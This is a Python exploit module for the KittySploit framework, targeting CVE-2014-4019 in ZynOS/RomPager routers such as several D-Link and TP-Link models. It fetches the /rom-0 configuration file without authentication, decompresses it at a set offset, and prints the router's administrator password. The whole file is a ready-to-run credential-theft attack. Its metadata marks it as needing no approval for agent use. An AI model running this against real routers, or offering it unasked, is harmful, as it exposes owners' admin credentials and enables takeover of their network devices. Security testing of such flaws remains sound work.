#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.router.rom0 import Rom0, ROM0_DEFAULT_OFFSET

_TESTED_MODELS = (
    "D-Link DSL-2600U (firmware v1.08)",
    "D-Link DSL-2520U",
    "D-Link DSL-2640R",
    "D-Link DSL-2740R",
    "TP-Link TD-8816 / TD-8817 / TD-8840T",
    "ZynOS / RomPager embedded devices",
)


class Module(Auxiliary, Http_client, Rom0):

    __info__ = {
        "name": "D-Link / ZynOS ROM-0 admin password disclosure",
        "description": (
            "Unauthenticated download of /rom-0 on ZynOS / RomPager-based routers exposes a "
            "compressed configuration blob. LZS decompression at offset 8568 reveals the "
            "device administrator password in plaintext. Tested on D-Link DSL-2600U firmware "
            "v1.08; affects multiple D-Link, TP-Link, ZyXEL, and ZTE models."
        ),
        "author": [
            "Amir Hossein Jamshidi",
            "KittySploit Team",
        ],
        "cve": ["CVE-2014-4019"],
        "references": [
            "https://www.dlink.com",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4019",
            "http://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/",
            "https://github.com/amirhosseinjamshidi64",
        ],
        "tags": [
            "d-link",
            "router",
            "rom-0",
            "zynos",
            "rompager",
            "disclosure",
            "credentials",
            "cve-2014-4019",
            "auxiliary",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "credential_access"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["credentials", "risk_signals"],
        },
    }

    port = OptPort(80, "Target HTTP port", required=True)
    ssl = OptBool(False, "Use HTTPS", required=True)
    decompress_offset = OptInteger(
        ROM0_DEFAULT_OFFSET,
        "Byte offset where the LZS-compressed chunk starts inside rom-0",
        required=False,
        advanced=True,
    )
    output_file = OptString("", "Optional path to save the raw /rom-0 response", required=False)

    def check(self):
        timeout = max(int(self.timeout or 10), 10)
        offset = int(self.decompress_offset or ROM0_DEFAULT_OFFSET)

        try:
            result = self.rom0_extract_from_target(offset=offset, timeout=timeout)
        except Exception as exc:
            return {"vulnerable": False, "reason": f"Check failed: {exc}", "confidence": "low"}

        status = result.get("status")
        if status == "success":
            return {
                "vulnerable": True,
                "reason": result.get("reason"),
                "confidence": "high",
                "details": f"password={result.get('password')}; size={result.get('size')}",
            }

        if status == "extract_failed":
            return {
                "vulnerable": True,
                "reason": result.get("reason"),
                "confidence": "medium",
                "details": f"size={result.get('size')}",
            }

        if status == "vulnerable":
            return {
                "vulnerable": True,
                "reason": result.get("reason"),
                "confidence": "high",
            }

        return {
            "vulnerable": False,
            "reason": result.get("reason") or "ROM-0 not exposed",
            "confidence": "medium" if status == "not_vulnerable" else "low",
        }

    def run(self):
        timeout = max(int(self.timeout or 10), 10)
        offset = int(self.decompress_offset or ROM0_DEFAULT_OFFSET)

        print_info("Affected families include: " + ", ".join(_TESTED_MODELS[:3]) + ", ...")

        probe = self.rom0_probe(timeout=timeout)
        if probe.get("status") != "vulnerable":
            print_error(probe.get("reason") or "Target does not expose a ROM-0 blob")
            return False

        content = probe.get("content") or b""
        print_success(f"Downloaded /rom-0 ({probe.get('size')} bytes)")

        out_path = str(self.output_file or "").strip()
        if out_path:
            try:
                with open(out_path, "wb") as handle:
                    handle.write(content)
                print_success(f"Saved raw ROM-0 to {out_path}")
            except OSError as exc:
                print_error(f"Could not write output_file: {exc}")
                return False

        print_status("Extracting administrator password from LZS chunk...")
        password = self.rom0_extract_password(content, offset=offset)
        if not password:
            print_error(
                "Could not extract password; try adjusting DECOMPRESS_OFFSET or inspect "
                "the saved rom-0 blob manually"
            )
            return False

        print_success(f"Router administrator password: {password}")
        return True
